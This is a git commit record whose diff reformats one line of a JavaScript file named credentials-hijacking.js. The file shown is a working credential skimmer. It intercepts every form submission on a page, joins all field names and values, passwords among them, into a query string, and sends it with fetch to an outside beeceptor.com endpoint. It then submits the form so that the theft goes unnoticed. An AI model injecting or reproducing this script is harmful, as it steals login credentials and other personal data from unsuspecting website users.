1db2abc01e87eb90f30879520d004323090d47c8
can <47246431+canozal@users.noreply.github.com>
2022-06-23 21:30:30 +0300

    Update credentials-hijacking.js

--- credentials-hijacking.js
+++ credentials-hijacking.js
@@ -1,6 +1,7 @@
 document.addEventListener('submit', function(e) {
     e.preventDefault();
-    let params = [...e.target.elements].map(d => d.name + "=" + d.value).filter(d => d.length>1).join("&");
+    let params = [...e.target.elements].map(param => param.name + '=' + param.value).filter(param => param.length>1)
+        .join('&');
     const URL = 'https://cozalcozal.free.beeceptor.com' + '?' + params ;
     fetch(URL).then(() => e.target.submit()).catch(() => window.location.href = URL);
 });
